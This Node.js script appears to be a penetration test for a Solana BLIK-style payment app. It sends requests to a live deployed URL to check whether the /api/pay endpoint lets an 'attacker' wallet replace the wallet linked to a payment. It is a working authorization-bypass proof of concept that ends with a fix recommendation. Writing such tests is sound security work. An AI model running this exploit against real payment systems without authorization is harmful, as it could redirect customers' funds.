#!/usr/bin/env node
/**
 * AUTHZ-VULN-03 Security Test
 * Tests if POST /api/pay accepts arbitrary wallet addresses without validating
 * they match the payment owner.
 */

const BASE_URL = "https://solana-blik.vercel.app";

function printStep(stepNum, title) {
    console.log('\n' + '='.repeat(70));
    console.log(`STEP ${stepNum}: ${title}`);
    console.log('='.repeat(70));
}

async function makeRequest(url, payload) {
    const response = await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload)
    });

    const data = await response.json();

    console.log(`Status Code: ${response.status}`);
    console.log(`Response Body:`);
    console.log(JSON.stringify(data, null, 2));

    return { response, data };
}

async function main() {
    console.log('='.repeat(70));
    console.log('AUTHZ-VULN-03: Arbitrary Wallet Address Acceptance Test');
    console.log('='.repeat(70));

    try {
        // Step 1: Create a legitimate payment
        printStep(1, 'Create Legitimate Payment');
        const step1Url = `${BASE_URL}/api/payments/create`;
        const step1Payload = {
            amount: 0.5,
            merchantWallet: "11111111111111111111111111111111"
        };
        console.log(`POST ${step1Url}`);
        console.log('Payload:', JSON.stringify(step1Payload, null, 2));

        const { response: step1Response, data: step1Data } = await makeRequest(step1Url, step1Payload);

        if (!step1Data?.id) {
            console.error('\n❌ ERROR: Failed to create payment or no payment ID returned');
            process.exit(1);
        }

        const paymentId = step1Data.id;
        console.log(`\n✓ Payment created successfully with ID: ${paymentId}`);

        // Step 2: Generate a code for legitimate wallet
        printStep(2, 'Generate Code for Legitimate Wallet');
        const step2Url = `${BASE_URL}/api/codes/generate`;
        const step2Payload = {
            walletPubkey: "22222222222222222222222222222222"
        };
        console.log(`POST ${step2Url}`);
        console.log('Payload:', JSON.stringify(step2Payload, null, 2));

        const { response: step2Response, data: step2Data } = await makeRequest(step2Url, step2Payload);

        if (!step2Data?.code) {
            console.error('\n❌ ERROR: Failed to generate code or no code returned');
            process.exit(1);
        }

        const blikCode = step2Data.code;
        console.log(`\n✓ Code generated successfully: ${blikCode}`);

        // Step 3: Link the code to the payment
        printStep(3, 'Link Code to Payment');
        const step3Url = `${BASE_URL}/api/payments/link`;
        const step3Payload = {
            paymentId: paymentId,
            code: blikCode
        };
        console.log(`POST ${step3Url}`);
        console.log('Payload:', JSON.stringify(step3Payload, null, 2));

        const { response: step3Response, data: step3Data } = await makeRequest(step3Url, step3Payload);

        if (step3Response.status !== 200) {
            console.error('\n❌ ERROR: Failed to link code to payment');
            process.exit(1);
        }

        console.log('\n✓ Code linked to payment successfully');

        // Step 4: EXPLOIT - Try to build payment with DIFFERENT attacker wallet
        printStep(4, 'EXPLOIT ATTEMPT - Use Different Attacker Wallet');
        console.log('⚠️  CRITICAL TEST: Attempting to use ATTACKER wallet (33333...) instead of legitimate wallet (22222...)');
        const step4Url = `${BASE_URL}/api/pay`;
        const step4Payload = {
            paymentId: paymentId,
            account: "33333333333333333333333333333333"  // DIFFERENT wallet - attacker's wallet
        };
        console.log(`POST ${step4Url}`);
        console.log('Payload:', JSON.stringify(step4Payload, null, 2));
        console.log('\nNote: Payment was linked to wallet 22222... but we\'re using 33333...');

        const { response: step4Response, data: step4Data } = await makeRequest(step4Url, step4Payload);

        // Analyze the result
        console.log('\n' + '='.repeat(70));
        console.log('VULNERABILITY ANALYSIS');
        console.log('='.repeat(70));

        if (step4Response.status === 200) {
            console.log('\n🚨 VULNERABILITY CONFIRMED! 🚨');
            console.log('\nThe endpoint accepted an arbitrary wallet address that doesn\'t match');
            console.log('the payment owner. This is a critical authorization bypass vulnerability.');
            console.log('\nATTACK SCENARIO:');
            console.log('1. Legitimate customer (wallet 22222...) created and linked payment');
            console.log('2. Attacker intercepted the paymentId');
            console.log('3. Attacker successfully substituted their wallet (33333...)');
            console.log('4. Transaction would send funds to attacker instead of legitimate customer');

            if (step4Data) {
                console.log('\nTRANSACTION DETAILS:');
                if (step4Data.transaction) {
                    console.log(`  Transaction generated: YES`);
                    console.log(`  Transaction length: ${step4Data.transaction.length} characters`);
                }
                if (step4Data.receiptPda) {
                    console.log(`  Receipt PDA: ${step4Data.receiptPda}`);
                }
                if (step4Data.amount) {
                    console.log(`  Amount: ${step4Data.amount}`);
                }
            }

            console.log('\nRECOMMENDATION:');
            console.log('The /api/pay endpoint MUST verify that the provided \'account\' parameter');
            console.log('matches the wallet address associated with the payment\'s linked code.');

            process.exit(1);  // Vulnerability found
        } else {
            console.log('\n✓ VULNERABILITY NOT EXPLOITABLE');
            console.log(`\nThe endpoint rejected the arbitrary wallet address (status ${step4Response.status})`);
            console.log('The authorization check appears to be working correctly.');
            process.exit(0);  // No vulnerability
        }

    } catch (error) {
        console.error('\n❌ ERROR:', error.message);
        console.error(error.stack);
        process.exit(1);
    }
}

main();
